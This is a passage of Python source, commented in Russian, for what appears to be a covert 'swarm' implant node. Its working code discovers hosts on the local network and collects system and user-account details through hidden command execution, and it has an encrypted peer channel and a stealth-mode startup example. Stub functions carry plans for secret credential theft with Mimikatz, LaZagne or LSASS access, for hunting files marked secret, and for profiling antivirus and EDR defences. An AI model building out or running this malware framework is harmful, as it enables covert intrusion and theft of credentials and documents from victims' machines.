                    task = self.tasks[task_id]
                    task["status"] = "failed"
                    task["error"] = str(e)
    
    def _execute_reconnaissance_task(self, task_data: Dict[str, Any]) -> Dict[str, Any]:
        """Выполняет задачу разведки."""
        target_type = task_data.get("target_type")
        
        result = {
            "target_type": target_type,
            "timestamp": time.time(),
            "data": {}
        }
        
        # Различные типы разведки
        if target_type == "network":
            # Сканирование сети
            result["data"] = self._scan_local_network()
        elif target_type == "system":
            # Сбор информации о системе
            result["data"] = self._collect_system_info()
        
        return result
    
    def _execute_data_extraction_task(self, task_data: Dict[str, Any]) -> Dict[str, Any]:
        """Выполняет задачу извлечения данных."""
        data_type = task_data.get("data_type")
        
        result = {
            "data_type": data_type,
            "timestamp": time.time(),
            "data": {}
        }
        
        # Различные типы данных
        if data_type == "credentials":
            # Извлечение учетных данных
            result["data"] = self._extract_credentials()
        elif data_type == "documents":
            # Поиск документов
            result["data"] = self._find_sensitive_documents()
        
        return result
    
    def _execute_system_analysis_task(self, task_data: Dict[str, Any]) -> Dict[str, Any]:
        """Выполняет задачу анализа системы."""
        analysis_type = task_data.get("analysis_type")
        
        result = {
            "analysis_type": analysis_type,
            "timestamp": time.time(),
            "data": {}
        }
        
        # Различные типы анализа
        if analysis_type == "vulnerabilities":
            # Поиск уязвимостей
            result["data"] = self._scan_for_vulnerabilities()
        elif analysis_type == "security_products":
            # Анализ продуктов безопасности
            result["data"] = self._analyze_security_products()
        
        return result
    
    def _scan_local_network(self) -> Dict[str, Any]:
        """Сканирует локальную сеть для обнаружения других хостов."""
        logger.info(f"Node {self.node.node_id}: Сканирование локальной сети...")
        results = {
            "timestamp": datetime.now().isoformat(),
            "method": "passive", # По умолчанию пассивный метод
            "hosts": [],
            "errors": []
        }
        command = ""
        parser: Optional[Callable[[str], List[Dict[str, str]]]] = None

        def parse_arp_windows(output: str) -> List[Dict[str, str]]:
            hosts = []
            lines = output.splitlines()
            interface_section = False
            for line in lines:
                line = line.strip()
                if not line:
                    interface_section = False
                    continue
                if line.startswith("Interface:"):
                    interface_section = True
                    continue
                if interface_section and len(line.split()) >= 3:
                    parts = line.split()
                    ip_addr = parts[0]
                    mac_addr = parts[1].replace("-", ":").lower()
                    addr_type = parts[2]
                    # Проверяем, что это валидный IP (не 224.x.x.x, 255.255.255.255 и т.д.)
                    try:
                        ip = ipaddress.ip_address(ip_addr)
                        if not ip.is_multicast and not ip.is_loopback and not ip.is_link_local and str(ip) != "255.255.255.255":
                             if mac_addr != "ff:ff:ff:ff:ff:ff":
                                 hosts.append({"ip": ip_addr, "mac": mac_addr, "type": addr_type})
                    except ValueError:
                        continue # Невалидный IP
            return hosts

        def parse_ip_neigh_linux(output: str) -> List[Dict[str, str]]:
            hosts = []
            lines = output.splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) < 5:
                    continue
                ip_addr = parts[0]
                mac_addr = parts[3]
                state = parts[-1]
                if mac_addr != "00:00:00:00:00:00" and state.upper() in ["REACHABLE", "STALE", "DELAY", "PROBE"]:
                    try:
                        ip = ipaddress.ip_address(ip_addr)
                        if not ip.is_multicast and not ip.is_loopback and not ip.is_link_local:
                             hosts.append({"ip": ip_addr, "mac": mac_addr, "state": state})
                    except ValueError:
                        continue
            return hosts

        os_platform = platform.system()
        if os_platform == "Windows":
            command = "arp -a"
            parser = parse_arp_windows
        elif os_platform == "Linux":
            command = "ip neigh show"
            parser = parse_ip_neigh_linux
        else:
            results["errors"].append("Unsupported platform for passive scan")
            return results

        if command and parser:
            exit_code, output = execute_command(command)
            if exit_code == 0:
                try:
                    results["hosts"] = parser(output)
                    logger.info(f"Node {self.node.node_id}: Обнаружено хостов (пассивно): {len(results['hosts'])}")
                except Exception as e:
                     results["errors"].append(f"Error parsing command output: {str(e)}")
                     logger.error(f"Node {self.node.node_id}: Ошибка парсинга вывода '{command}': {str(e)}", exc_info=True)
            else:
                results["errors"].append(f"Command '{command}' failed with code {exit_code}")
                logger.warning(f"Node {self.node.node_id}: Команда '{command}' завершилась с кодом {exit_code}")
        
        # TODO: Добавить активное сканирование (nmap, fping, Test-NetConnection) как опцию
        # if self.allow_active_scan:
        #    results["method"] = "active"
        #    active_hosts = self._perform_active_scan()
        #    # Объединить результаты

        return results

    def _collect_system_info(self) -> Dict[str, Any]:
        """Собирает базовую информацию о системе с помощью системных команд."""
        logger.info(f"Node {self.node.node_id}: Сбор системной информации...")
        info = {
            "platform": platform.system(),
            "node_id": self.node.node_id,
            "timestamp": datetime.now().isoformat(),
            "hostname": socket.gethostname(),
            "details": {}
        }
        commands = []
        
        if info["platform"] == "Windows":
            commands = [
                ("systeminfo", "systeminfo"), 
                ("ipconfig", "ipconfig /all"),
                ("users", "net user")
                # Добавить другие команды: wmic cpu get name, wmic memorychip get capacity, etc.
            ]
        elif info["platform"] == "Linux":
            commands = [
                ("uname", "uname -a"),
                ("os_release", "cat /etc/os-release"), # Более надежно чем lsb_release
                ("cpuinfo", "lscpu"),
                ("meminfo", "free -h"),
                ("ipaddr", "ip addr"),
                ("whoami", "whoami"),
                # ("users", "cat /etc/passwd") # Может быть слишком много данных
            ]
        else:
             info["details"]["error"] = "Unsupported platform"
             return info
             
        results = {}
        for key, cmd in commands:
            exit_code, output = execute_command(cmd)
            results[key] = {"exit_code": exit_code, "output": output}
            time.sleep(0.1) # Небольшая пауза между командами
            
        info["details"] = results
        logger.info(f"Node {self.node.node_id}: Сбор системной информации завершен.")
        return info

    def _extract_credentials(self) -> Dict[str, Any]:
        # TODO: Реализовать безопасный и скрытый сбор учетных данных
        # Используя Mimikatz, LaZagne, или доступ к LSASS (см. secret_dev_notes.md)
        logger.warning(f"Node {self.node.node_id}: Функция извлечения учетных данных не реализована (placeholder).")
        return {"message": "Credential extraction placeholder"}

    def _find_sensitive_documents(self) -> Dict[str, Any]:
        # TODO: Реализовать поиск документов по ключевым словам и шаблонам
        # Например, поиск файлов *.doc, *.xls, *.pdf, *.txt содержащих "password", "secret", "confidential"
        logger.warning(f"Node {self.node.node_id}: Функция поиска документов не реализована (placeholder).")
        return {"message": "Document search placeholder"}

    def _scan_for_vulnerabilities(self) -> Dict[str, Any]:
        # TODO: Реализовать сканирование известных уязвимостей
        # Например, проверка версий ПО, запущенных служб, использование локальных сканеров (если есть)
        logger.warning(f"Node {self.node.node_id}: Функция сканирования уязвимостей не реализована (placeholder).")
        return {"message": "Vulnerability scanning placeholder"}

    def _analyze_security_products(self) -> Dict[str, Any]:
        # TODO: Реализовать анализ запущенных антивирусов, EDR, файрволов
        # Например, проверка списка процессов, служб, драйверов
        logger.warning(f"Node {self.node.node_id}: Функция анализа защитных продуктов не реализована (placeholder).")
        return {"message": "Security product analysis placeholder"}

# Пример использования (закомментирован)
"""
if __name__ == "__main__":
    # Создаем узел роевого интеллекта
    node = SwarmNode(
        bootstrap_nodes=["192.168.1.100:8080"],
        discovery_enabled=True,
        stealth_mode=True
    )
    
    # Запускаем узел
    node.start()
    
    try:
        # Ждем, пока узел работает
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Останавливаем узел при прерывании
        node.stop()
""" 

class SecureSwarmComm:
    def __init__(self):
        self.private_key = PrivateKey.generate()
        self.public_key = self.private_key.public_key
    def encrypt(self, peer_pubkey_bytes, message: bytes) -> bytes:
        peer_pubkey = PublicKey(peer_pubkey_bytes)
        box = Box(self.private_key, peer_pubkey)
        nonce = nacl.utils.random(Box.NONCE_SIZE)
        return nonce + box.encrypt(message, nonce).ciphertext
    def decrypt(self, peer_pubkey_bytes, data: bytes) -> bytes:
        peer_pubkey = PublicKey(peer_pubkey_bytes)
        box = Box(self.private_key, peer_pubkey)
        nonce = data[:Box.NONCE_SIZE]
        ciphertext = data[Box.NONCE_SIZE:]
        return box.decrypt(ciphertext, nonce) 

# ЗАГЛУШКА execute_command - ИСПОЛЬЗУЙТЕ РЕАЛЬНЫЙ ВЫЗОВ command_executor
def execute_command(command_line: str, timeout_ms: int = 10000, hidden: bool = True) -> Tuple[int, str]:
    logger.warning(f"Используется ЗАГЛУШКА execute_command для: {command_line}")
    if platform.system() == "Windows":
        if "systeminfo" in command_line:
            return 0, """OS Name:                   Microsoft Windows 11 Pro
OS Version:                10.0.22631 N/A Build 22631
System Manufacturer:       LENOVO
System Model:              20XW004QRT
Processor(s):            1 Processor(s) Installed.
                         [01]: Intel64 Family 6 Model 140 Stepping 1 GenuineIntel ~1690 Mhz
Total Physical Memory:     15,886 MB"""
        elif "ipconfig /all" in command_line:
             return 0, """Windows IP Configuration
   Host Name . . . . . . . . . . . . : DESKTOP-AGENTX
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet:
   Connection-specific DNS Suffix  . : home
   Description . . . . . . . . . . . : Realtek PCIe GbE Family Controller
   Physical Address. . . . . . . . . : A8-5E-45-FF-00-11
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.1.100(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
   DNS Servers . . . . . . . . . . . : 8.8.8.8
                                       8.8.4.4"""
        elif "net user" in command_line:
             return 0, """User accounts for \\\\DESKTOP-AGENTX
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
User1                  WDAGUtilityAccount       
The command completed successfully."""
    else: # Linux
        if "uname -a" in command_line:
            return 0, "Linux agentx-dev 5.15.0-76-generic #83-Ubuntu SMP Mon Jun 5 14:18:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux"
        elif "lscpu" in command_line:
             return 0, """Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              8
Model name:          Intel(R) Core(TM) i7-1165G7 @ 2.80GHz
Vendor ID:           GenuineIntel"""
        elif "free -h" in command_line:
             return 0, """              total        used        free      shared  buff/cache   available
Mem:           15Gi       8.1Gi       1.1Gi       1.3Gi       6.4Gi       6.0Gi
Swap:         2.0Gi       100Mi       1.9Gi"""
        elif "ip addr" in command_line:
             return 0, """1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic eth0
       valid_lft 86300sec preferred_lft 86300sec"""
        elif "whoami" in command_line:
            return 0, "agentx_user"
    return 1, "Dummy output for this command" 